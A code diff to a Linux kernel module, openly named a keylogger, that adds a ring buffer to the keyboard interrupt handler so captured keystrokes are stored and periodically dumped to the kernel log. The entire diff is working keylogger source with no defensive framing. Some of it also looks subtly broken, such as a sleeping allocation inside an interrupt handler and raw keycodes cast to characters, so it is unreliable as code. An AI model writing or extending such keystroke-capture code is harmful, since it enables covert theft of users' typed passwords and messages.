@@ -1,12 +1,48 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
+#include <linux/slab.h>
 
 #include "keylogger.h"
 
+#define BUFFER_SIZE 4096  // Buffer size in bytes
 #define KBD_IRQ 1  // Keyboard IRQ number
 
 MODULE_LICENSE("GPL");
+
+
+char buffer[BUFFER_SIZE] = {'\0'};
+int fill = 0;  // Index to fill buffer
+
+void producer(char key){
+    buffer[fill] = key;
+    fill = (fill + 1) % BUFFER_SIZE;
+}
+
+/**
+    Don't forget to kfree this after using
+    Call this and you'll have BUFFER_SIZE chars to print
+    All \0 is non inputs (should not print)
+*/
+char *consumer(void){
+    int num_items_to_consume = BUFFER_SIZE;
+    int consumed_count = 0;
+    char *consumed_items = (char *)kmalloc(num_items_to_consume * sizeof(char), GFP_KERNEL);
+
+    for(int i = 0; i<num_items_to_consume; i++){
+        consumed_items[i] = '\0';
+    }
+    
+    while (consumed_count < num_items_to_consume) {
+        char item = buffer[(fill - consumed_count - 1 + BUFFER_SIZE) % BUFFER_SIZE];
+        buffer[(fill - consumed_count - 1 + BUFFER_SIZE) % BUFFER_SIZE] = '\0';
+        
+        consumed_items[consumed_count] = item;
+        consumed_count++;
+    }
+
+    return consumed_items;
+}
 
 // Keyboard interrupt handler
 irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id)
@@ -18,10 +54,18 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id)
 
         char key = (char)keycode;
 
-        // Process the keycode as per your requirements
-        printk(KERN_INFO "Key pressed: %c\n",key);
-
         // Store the keycode in a linked list or perform any other required operation
+        producer(key);
+
+        if(fill > 100){
+            char* keys = consumer();
+            printk(KERN_INFO "Keys pressed: ");
+            for(int i = 0; i < BUFFER_SIZE; i++){
+                printk(KERN_INFO " %c,", keys[i]);
+            }
+            kfree(keys);
+            printk(KERN_INFO "\n");
+        }
     }
 
     return IRQ_NONE;
